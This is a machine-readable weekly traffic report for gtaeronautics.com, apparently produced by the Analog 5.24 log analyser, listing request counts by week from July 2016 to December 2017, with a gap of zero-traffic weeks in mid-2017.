x	VE	analog 5.24
x	HN	gtaeronautics.com
W	Rr	1103	0.114	2017	12	17
W	Rr	1406	0.146	2017	12	10
W	Rr	0	0.000	2017	12	03
W	Rr	1335	0.139	2017	11	26
W	Rr	1427	0.148	2017	11	19
W	Rr	1662	0.173	2017	11	12
W	Rr	1414	0.147	2017	11	05
W	Rr	1349	0.140	2017	10	29
W	Rr	1208	0.125	2017	10	22
W	Rr	2013	0.209	2017	10	15
W	Rr	1832	0.190	2017	10	08
W	Rr	0	0.000	2017	10	01
W	Rr	0	0.000	2017	09	24
W	Rr	0	0.000	2017	09	17
W	Rr	0	0.000	2017	09	10
W	Rr	0	0.000	2017	09	03
W	Rr	0	0.000	2017	08	27
W	Rr	0	0.000	2017	08	20
W	Rr	0	0.000	2017	08	13
W	Rr	0	0.000	2017	08	06
W	Rr	0	0.000	2017	07	30
W	Rr	0	0.000	2017	07	23
W	Rr	0	0.000	2017	07	16
W	Rr	0	0.000	2017	07	09
W	Rr	0	0.000	2017	07	02
W	Rr	0	0.000	2017	06	25
W	Rr	0	0.000	2017	06	18
W	Rr	0	0.000	2017	06	11
W	Rr	0	0.000	2017	06	04
W	Rr	25	0.003	2017	05	28
W	Rr	1838	0.191	2017	05	21
W	Rr	1915	0.199	2017	05	14
W	Rr	1676	0.174	2017	05	07
W	Rr	1677	0.174	2017	04	30
W	Rr	2071	0.215	2017	04	23
W	Rr	1978	0.205	2017	04	16
W	Rr	1874	0.195	2017	04	09
W	Rr	3435	0.357	2017	04	02
W	Rr	2619	0.272	2017	03	26
W	Rr	2633	0.273	2017	03	19
W	Rr	2413	0.250	2017	03	12
W	Rr	3092	0.321	2017	03	05
W	Rr	2295	0.238	2017	02	26
W	Rr	2204	0.229	2017	02	19
W	Rr	1869	0.194	2017	02	12
W	Rr	1973	0.205	2017	02	05
W	Rr	1783	0.185	2017	01	29
W	Rr	1768	0.184	2017	01	22
W	Rr	1585	0.165	2017	01	15
W	Rr	1768	0.184	2017	01	08
W	Rr	1740	0.181	2017	01	01
W	Rr	1549	0.161	2016	12	25
W	Rr	2202	0.229	2016	12	18
W	Rr	1812	0.188	2016	12	11
W	Rr	2648	0.275	2016	12	04
W	Rr	2236	0.232	2016	11	27
W	Rr	1321	0.137	2016	11	20
W	Rr	1996	0.207	2016	11	13
W	Rr	1716	0.178	2016	11	06
W	Rr	1564	0.162	2016	10	30
W	Rr	1362	0.141	2016	10	23
W	Rr	1707	0.177	2016	10	16
W	Rr	1696	0.176	2016	10	09
W	Rr	36	0.004	2016	10	02
W	Rr	2002	0.208	2016	09	25
W	Rr	1399	0.145	2016	09	18
W	Rr	1199	0.124	2016	09	11
W	Rr	1326	0.138	2016	09	04
W	Rr	1316	0.137	2016	08	28
W	Rr	1257	0.130	2016	08	21
W	Rr	1208	0.125	2016	08	14
W	Rr	1602	0.166	2016	08	07
W	Rr	1319	0.137	2016	07	31
W	Rr	1796	0.186	2016	07	24
